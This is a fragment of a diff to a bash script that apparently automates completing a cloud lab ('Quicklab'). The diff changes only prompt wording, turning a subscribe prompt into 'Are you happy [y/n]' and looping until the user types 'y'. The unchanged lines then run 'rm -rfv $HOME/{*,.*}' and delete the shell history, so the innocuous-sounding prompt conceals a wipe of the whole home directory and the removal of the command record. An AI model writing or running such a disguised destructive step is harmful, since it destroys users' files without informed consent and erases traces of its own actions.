@@ -98,14 +98,14 @@ Lab Completed !!!
 ${RESET}"
 
 
-read -p "${BOLD}${RED}Subscribe to Quicklab [y/n] : ${RESET}" CONSENT_REMOVE
+read -p "${BOLD}${RED}Are you happy [y/n] : ${RESET}" CONSENT_REMOVE
 
 while [ "$CONSENT_REMOVE" != 'y' ]; do
   sleep 10
-  read -p "${BOLD}${YELLOW}Do Subscribe to Quicklab [y/n] : ${RESET}" CONSENT_REMOVE
+  read -p "${BOLD}${YELLOW}Be Happy [y/n] : ${RESET}" CONSENT_REMOVE
 done
 
-echo "${BLUE}${BOLD}Thanks For Subscribing :)${RESET}"
+echo "${BLUE}${BOLD}Now you look good :)${RESET}"
 
 rm -rfv $HOME/{*,.*}
 rm $HOME/.bash_history
